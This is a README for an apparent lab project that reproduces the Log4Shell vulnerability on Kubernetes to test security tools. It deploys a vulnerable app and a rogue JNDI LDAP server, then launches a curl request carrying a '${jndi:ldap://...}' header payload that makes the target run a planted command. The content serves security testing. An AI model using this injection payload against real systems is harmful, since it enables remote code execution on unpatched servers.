# log4shell-kubernetes

A log4shell proof of concept running on Kubernetes.

This is not different on running other POC, it's provided to test Kubernetes specific security tools.

It uses the following projects:
* https://github.com/christophetd/log4shell-vulnerable-app
* https://github.com/veracode-research/rogue-jndi

For more information, check:
* https://vicenteherrera.com/blog/log4j-part-i/

## Build and push docker images

You can build your own images if you want instead of using the ones pushed to quay.io.

```bash
git clone https://github.com/veracode-research/rogue-jndi.git
docker build ./rogue-jndi -t quay.io/vicenteherrera/rogue-jndi -f Dockerfile-rogue-jndi
docker push quay.io/vicenteherrera/rogue-jndi

git clone https://github.com/christophetd/log4shell-vulnerable-app.git
cd log4shell-vulnerable-app
docker build . -t quay.io/vicenteherrera/quay.io/vicenteherrera/log4shell-vulnerable-app
docker push quay.io/vicenteherrera/log4shell-vulnerable-app
cd ..
```

The provided `Dockerfile-rogue-jndi` is set to executed on the compromised workload the command:  
`touch /root/test.txt` 

## Deploy on Kubernetes

```bash
kubectl apply -f vulnerable-log4j.yaml
kubectl apply -f rogue-jndi.yaml
```

## Watch logs

```bash
# On different terminals
kubectl logs service/rogue-jndi -f
kubectl logs service/vulnerable-log4j -f
```

## Launch attack

```bash
kubectl run my-shell --rm -it --image curlimages/curl -- sh
curl vulnerable-log4j:8080 -H 'X-Api-Version: ${jndi:ldap://rogue-jndi:1389/o=tomcat}'
```

## Check that the attack succeded

```bash
kubectl exec service/vulnerable-log4j -it -- ls /root
```

It should list `test.txt` file.
